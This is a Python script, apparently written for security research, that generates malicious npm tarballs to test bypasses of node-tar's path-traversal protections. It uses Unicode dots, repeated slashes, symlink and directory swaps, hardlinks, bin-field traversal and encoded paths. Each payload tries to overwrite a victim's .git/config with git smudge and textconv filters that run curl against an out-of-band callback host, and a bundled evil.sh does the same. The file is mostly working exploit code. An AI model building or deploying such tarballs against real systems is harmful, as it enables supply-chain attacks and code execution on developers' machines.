#!/usr/bin/env python3
"""
NPM path traversal bypass tests
Tests various techniques to bypass node-tar validation

Key insight: Tarball URLs bypass npm registry validation!
When using "pkg": "https://attacker.com/pkg.tar.gz":
- NO registry-side validation (symlinks, hardlinks, absolute paths)
- Only local npm/node-tar validation applies
"""

import tarfile
import io
import os

OAST = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun"
OUTPUT_DIR = os.path.dirname(os.path.abspath(__file__))

def create_base_package():
    """Return base package.json and index.js"""
    pkg = b'{"name":"test","version":"1.0.0","main":"index.js"}'
    idx = b'module.exports = {loaded: true};'
    return pkg, idx

def malicious_git_config(marker):
    return f'''[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
[filter "{marker}"]
    smudge = curl https://{OAST}/{marker}
    clean = cat
[diff "{marker}"]
    textconv = curl https://{OAST}/{marker}-diff
'''.encode()

def add_file(tar, name, content):
    info = tarfile.TarInfo(name=name)
    info.size = len(content)
    tar.addfile(info, io.BytesIO(content))

def test_unicode_normalization():
    """Test 1: Unicode normalization bypass

    Theory: node-tar checks for literal '..' in ASCII
    Unicode chars that might normalize to '.' on filesystem:
    - U+FF0E (Fullwidth Full Stop): ．
    - U+2024 (One Dot Leader): ․
    - U+FE52 (Small Full Stop): ﹒
    """
    tar = tarfile.open(f'{OUTPUT_DIR}/unicode.tar.gz', 'w:gz')
    pkg, idx = create_base_package()

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', idx)

    # Unicode bypass attempts
    unicode_dots = [
        ('\uff0e\uff0e', 'fullwidth'),      # Fullwidth ．．
        ('\u2024\u2024', 'onedot'),          # One dot leader ․․
        ('\ufe52\ufe52', 'small'),           # Small full stop ﹒﹒
    ]

    for dots, marker in unicode_dots:
        # Try: package/．．/．．/．．/.git/config
        path = f'package/{dots}/{dots}/{dots}/.git/config'
        add_file(tar, path, malicious_git_config(f'unicode-{marker}'))

    tar.close()
    print(f"[+] Created unicode.tar.gz")

def test_absolute_paths():
    """Test 2: Repeated absolute paths (CVE-2021-32804 variant)

    Theory: node-tar only strips ONE leading '/'. Multiple slashes might bypass.
    """
    tar = tarfile.open(f'{OUTPUT_DIR}/absolute.tar.gz', 'w:gz')
    pkg, idx = create_base_package()

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', idx)

    # Try various absolute path patterns
    abs_paths = [
        ('///.git/config', 'abs-3slash'),
        ('////.git/config', 'abs-4slash'),
        ('/////.git/config', 'abs-5slash'),
        ('///////tmp/evil', 'abs-7slash'),
    ]

    for path, marker in abs_paths:
        add_file(tar, path, malicious_git_config(marker))

    tar.close()
    print(f"[+] Created absolute.tar.gz")

def test_symlink_attack():
    """Test 3: Symlink-based attacks (CVE-2021-32803 bypass)

    MOST PROMISING: Registry blocks symlinks, but we bypass registry!

    Attack 1: Simple symlink pointing outside
    Attack 2: Directory-to-symlink swap
    """
    tar = tarfile.open(f'{OUTPUT_DIR}/symlink.tar.gz', 'w:gz')
    pkg, idx = create_base_package()

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', idx)

    # Attack 1: Symlink pointing to .git/config
    info = tarfile.TarInfo(name='package/evil_link')
    info.type = tarfile.SYMTYPE
    info.linkname = '../../../.git/config'
    tar.addfile(info)

    # Attack 2: Directory-to-symlink swap (CVE-2021-32803)
    # First create directory
    info = tarfile.TarInfo(name='package/swap/')
    info.type = tarfile.DIRTYPE
    info.mode = 0o755
    tar.addfile(info)

    # Replace directory with symlink of same name
    info = tarfile.TarInfo(name='package/swap')
    info.type = tarfile.SYMTYPE
    info.linkname = '../../../.git'
    tar.addfile(info)

    # Write file "into" the symlinked directory
    add_file(tar, 'package/swap/config', malicious_git_config('symlink-swap'))

    # Attack 3: Symlink to parent directory, then traverse
    info = tarfile.TarInfo(name='package/parent')
    info.type = tarfile.SYMTYPE
    info.linkname = '..'
    tar.addfile(info)

    add_file(tar, 'package/parent/parent/parent/.git/config', malicious_git_config('symlink-parent'))

    tar.close()
    print(f"[+] Created symlink.tar.gz")

def test_hardlink_attack():
    """Test 4: Hardlink attacks

    Registry blocks hardlinks, but we bypass registry!

    Hardlinks can:
    1. Link to existing files
    2. Be overwritten to modify the target
    """
    tar = tarfile.open(f'{OUTPUT_DIR}/hardlink.tar.gz', 'w:gz')
    pkg, idx = create_base_package()

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', idx)

    # Hardlink to .git/config (if it exists)
    info = tarfile.TarInfo(name='package/hardlink_config')
    info.type = tarfile.LNKTYPE
    info.linkname = '../../../.git/config'
    tar.addfile(info)

    # Hardlink to .gitattributes
    info = tarfile.TarInfo(name='package/hardlink_attrs')
    info.type = tarfile.LNKTYPE
    info.linkname = '../../../.gitattributes'
    tar.addfile(info)

    tar.close()
    print(f"[+] Created hardlink.tar.gz")

def test_bin_traversal():
    """Test 5: bin field path traversal (CVE-2019-16775/16776)

    npm creates symlinks in node_modules/.bin for bin entries.
    If bin key contains '../', symlink created at traversed path.

    Patched in npm 6.13.3, but tarball URL might bypass.
    """
    tar = tarfile.open(f'{OUTPUT_DIR}/bin_traversal.tar.gz', 'w:gz')

    # Malicious package.json with bin traversal
    pkg = b'''{
  "name": "bin-test",
  "version": "1.0.0",
  "main": "index.js",
  "bin": {
    "../../../.git/config": "./evil.sh",
    "../../../../.gitattributes": "./attrs.sh",
    "..\\\\..\\\\..\\\\../.git/config": "./evil.sh"
  }
}'''

    idx = b'module.exports = {loaded: true};'

    # evil.sh is what the symlink will point to
    evil_sh = f'''#!/bin/sh
curl https://{OAST}/bin-traversal
'''.encode()

    # This becomes .gitattributes content via symlink
    attrs_sh = b'''* filter=exploit
* diff=exploit
'''

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', idx)
    add_file(tar, 'package/evil.sh', evil_sh)
    add_file(tar, 'package/attrs.sh', attrs_sh)

    tar.close()
    print(f"[+] Created bin_traversal.tar.gz")

def test_mixed_attack():
    """Test 6: Combined attack with multiple vectors"""
    tar = tarfile.open(f'{OUTPUT_DIR}/mixed.tar.gz', 'w:gz')

    # Package with bin traversal AND symlinks
    pkg = b'''{
  "name": "mixed-attack",
  "version": "1.0.0",
  "main": "index.js",
  "bin": {
    "../../../.gitattributes": "./gitattrs"
  }
}'''

    gitattrs = b'''* filter=exploit
* diff=exploit
'''

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', b'module.exports = {};')
    add_file(tar, 'package/gitattrs', gitattrs)

    # Also add symlink attack
    info = tarfile.TarInfo(name='package/git_link')
    info.type = tarfile.SYMTYPE
    info.linkname = '../../../.git'
    tar.addfile(info)

    # Write config via symlink
    add_file(tar, 'package/git_link/config', malicious_git_config('mixed'))

    tar.close()
    print(f"[+] Created mixed.tar.gz")

def test_path_variations():
    """Test 7: Various path encoding tricks"""
    tar = tarfile.open(f'{OUTPUT_DIR}/path_tricks.tar.gz', 'w:gz')
    pkg, idx = create_base_package()

    add_file(tar, 'package/package.json', pkg)
    add_file(tar, 'package/index.js', idx)

    # Various path tricks
    paths = [
        ('package/./../../.git/config', 'dot-slash'),
        ('package/../package/../../../.git/config', 'back-forth'),
        ('package/.../.git/config', 'triple-dot'),
        ('package/..%2f..%2f..%2f.git/config', 'url-encoded'),
        ('package/..%252f..%252f..%252f.git/config', 'double-encoded'),
    ]

    for path, marker in paths:
        try:
            add_file(tar, path, malicious_git_config(marker))
        except Exception as e:
            print(f"  [-] Skipped {marker}: {e}")

    tar.close()
    print(f"[+] Created path_tricks.tar.gz")

if __name__ == '__main__':
    print(f"[*] Creating test tarballs in {OUTPUT_DIR}/")
    print(f"[*] OAST endpoint: {OAST}")
    print()

    test_unicode_normalization()
    test_absolute_paths()
    test_symlink_attack()
    test_hardlink_attack()
    test_bin_traversal()
    test_mixed_attack()
    test_path_variations()

    print()
    print(f"[*] All tarballs created!")
    print()
    print("Test order (most to least promising):")
    print("  1. symlink.tar.gz    - Directory-to-symlink swap (CVE-2021-32803)")
    print("  2. hardlink.tar.gz   - Hardlink to .git/config")
    print("  3. mixed.tar.gz      - Combined symlink + bin traversal")
    print("  4. bin_traversal.tar.gz - bin field path traversal")
    print("  5. unicode.tar.gz    - Unicode normalization bypass")
    print("  6. absolute.tar.gz   - Repeated absolute paths")
    print("  7. path_tricks.tar.gz - Various encoding tricks")
